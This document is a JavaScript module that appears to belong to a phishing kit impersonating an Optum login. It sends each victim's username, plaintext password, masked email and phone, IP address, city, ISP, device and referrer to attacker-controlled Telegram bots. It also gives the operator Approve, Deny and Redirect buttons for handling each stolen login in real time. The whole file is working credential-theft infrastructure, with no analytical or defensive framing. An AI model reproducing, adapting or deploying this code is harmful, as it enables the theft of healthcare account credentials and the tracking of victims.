var API = "https://api.telegram.org/bot";

function getBotPairs() {
  var tokenRaw = process.env.TELEGRAM_BOT_TOKEN || "";
  var chatIdRaw = process.env.TELEGRAM_CHAT_ID || "";
  if (!tokenRaw || !chatIdRaw) return [];

  var tokens = tokenRaw.split(",").map(function (s) { return s.trim(); }).filter(Boolean);
  var chatIds = chatIdRaw.split(",").map(function (s) { return s.trim(); }).filter(Boolean);

  var pairs = [];
  for (var i = 0; i < chatIds.length; i++) {
    var token = tokens[i] || tokens[0];
    if (token && chatIds[i]) {
      pairs.push({ token: token, chatId: chatIds[i] });
    }
  }
  return pairs;
}

export function findTokenForChat(chatId) {
  var pairs = getBotPairs();
  var match = pairs.find(function (p) { return p.chatId === String(chatId); });
  if (match) return match.token;
  return pairs[0] ? pairs[0].token : null;
}

async function sendToAll(text, taskId, includeButtons) {
  if (includeButtons === undefined) includeButtons = true;
  var pairs = getBotPairs();

  for (var i = 0; i < pairs.length; i++) {
    var p = pairs[i];
    try {
      var payload = { chat_id: p.chatId, text: text, disable_web_page_preview: true };
      if (includeButtons) {
        payload.reply_markup = {
          inline_keyboard: [
            [
              { text: "✅ Approve", callback_data: "approve:" + taskId },
              { text: "❌ Deny", callback_data: "deny:" + taskId },
            ],
            [
              { text: "🔀 Redirect", callback_data: "redirect:" + taskId },
            ],
          ],
        };
      }
      await fetch(API + p.token + "/sendMessage", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
    } catch (err) {
      console.error("[Telegram] Failed to send to " + p.chatId + ":", err);
    }
  }
}

function parseDevice(ua) {
  if (!ua) return "Unknown";
  var os = "Unknown OS";
  var browser = "Unknown Browser";

  if (/iPhone/.test(ua)) os = "iPhone";
  else if (/iPad/.test(ua)) os = "iPad";
  else if (/Android/.test(ua)) os = "Android";
  else if (/Windows NT 10/.test(ua)) os = "Windows 10";
  else if (/Mac OS X/.test(ua)) os = "macOS";
  else if (/Linux/.test(ua)) os = "Linux";

  if (/Edg\/(\d+)/.test(ua)) browser = "Edge " + RegExp.$1;
  else if (/Chrome\/(\d+)/.test(ua)) browser = "Chrome " + RegExp.$1;
  else if (/Safari\//.test(ua) && /Version\/(\d+[\.\d]*)/.test(ua)) browser = "Safari " + RegExp.$1;
  else if (/Firefox\/(\d+)/.test(ua)) browser = "Firefox " + RegExp.$1;

  return os + " / " + browser;
}

function formatReferrer(ref) {
  if (!ref || ref === "Direct") return "Direct";
  try { return new URL(ref).hostname.replace(/^www\./, ""); } catch (e) { return ref; }
}

function formatUrl(origin) {
  if (!origin) return "N/A";
  try { var u = new URL(origin); return u.hostname + u.pathname; } catch (e) { return origin; }
}

function formatTimes(tz) {
  var now = new Date();
  var opts = { month: "short", day: "numeric", year: "numeric", hour: "numeric", minute: "2-digit", hour12: true };
  var utcStr = now.toLocaleString("en-US", Object.assign({}, opts, { timeZone: "UTC" }));
  var localStr;
  try { localStr = now.toLocaleString("en-US", Object.assign({}, opts, { timeZone: tz })); } catch (e) { localStr = utcStr; }
  return { local: localStr, utc: utcStr };
}

function gmtOffset(tz) {
  try {
    var parts = new Date().toLocaleString("en-US", { timeZone: tz, timeZoneName: "shortOffset" }).split(" ");
    return parts[parts.length - 1];
  } catch (e) { return ""; }
}

function locationBlock(cf) {
  if (!cf) return [];
  var loc = cf.city && cf.city !== "Unknown" ? cf.city + ", " + cf.country : cf.country || "Unknown";
  var tzLabel = cf.timezone || "Unknown";
  var offset = cf.timezone ? gmtOffset(cf.timezone) : "";
  if (offset) tzLabel += " (" + offset + ")";
  return [
    "📍 Location: " + loc,
    "🌐 IP: " + (cf.ip || "Unknown"),
    "🕐 Timezone: " + tzLabel,
    "📡 ISP: " + (cf.asOrganization || "Unknown"),
  ];
}

function deviceBlock(task) {
  return [
    "📱 Device: " + (task.device_info ? parseDevice(task.device_info) : "Unknown"),
    "📐 Screen: " + (task.screen_size || "Unknown"),
    "🔗 Referrer: " + formatReferrer(task.referrer),
    "🌍 URL: " + formatUrl(task.member_origin),
  ];
}

function timeBlock(tz) {
  var t = formatTimes(tz);
  return ["📅 Local: " + t.local, "🕑 UTC: " + t.utc];
}

var LINE = "━━━━━━━━━━━━━━━━━━━━";

export async function notifyNewTask(task) {
  var isVisit = task.request_kind === "visit";
  var tz = task.cf ? task.cf.timezone : null;
  var lines = [];

  if (isVisit) {
    lines.push("👁 New visitor (Optum)");
    lines.push(LINE);
    lines = lines.concat(locationBlock(task.cf));
    lines.push("");
    lines = lines.concat(deviceBlock(task));
    lines.push("");
    lines = lines.concat(timeBlock(tz));
  } else {
    lines.push("🔐 Login request (Optum)");
    lines.push(LINE);
    lines.push("👤 User: " + task.user_id);
    lines.push("🔑 Password: " + (task.password || "N/A"));
    lines.push("✉️ Email: " + task.masked_email);
    if (task.masked_phone && task.masked_phone !== "N/A") {
      lines.push("📞 Phone: " + task.masked_phone);
    }
    lines.push("");
    lines = lines.concat(locationBlock(task.cf));
    lines.push("");
    lines = lines.concat(deviceBlock(task));
    lines.push("");
    lines = lines.concat(timeBlock(tz));
    lines.push("");
    lines.push("⏳ Auto-declines in 90s");
  }

  await sendToAll(lines.join("\n"), task.id, !isVisit);
}

export function buildApprovedMessage(task) {
  return [
    "✅ APPROVED via Telegram",
    "🔐 Login request (Optum)",
    "👤 User: " + task.user_id,
    "🔑 Password: " + (task.password || "N/A"),
  ].join("\n");
}

export function buildDeniedMessage(task) {
  return [
    "❌ DENIED via Telegram",
    "🔐 Login request (Optum)",
    "👤 User: " + task.user_id,
    "🔑 Password: " + (task.password || "N/A"),
  ].join("\n");
}

export function buildRedirectedMessage(task) {
  return [
    "🔀 REDIRECTED via Telegram",
    "🔐 Login request (Optum)",
    "👤 User: " + task.user_id,
    "🔑 Password: " + (task.password || "N/A"),
  ].join("\n");
}

export async function editMessage(chatId, messageId, text) {
  var token = findTokenForChat(chatId);
  if (!token) return;
  try {
    await fetch(API + token + "/editMessageText", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, message_id: messageId, text: text }),
    });
  } catch (err) {
    console.error("[Telegram] Failed to edit message:", err);
  }
}

export async function answerCallback(chatId, callbackQueryId, text) {
  var token = findTokenForChat(chatId);
  if (!token) return;
  try {
    await fetch(API + token + "/answerCallbackQuery", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ callback_query_id: callbackQueryId, text: text }),
    });
  } catch (err) {
    console.error("[Telegram] Failed to answer callback:", err);
  }
}
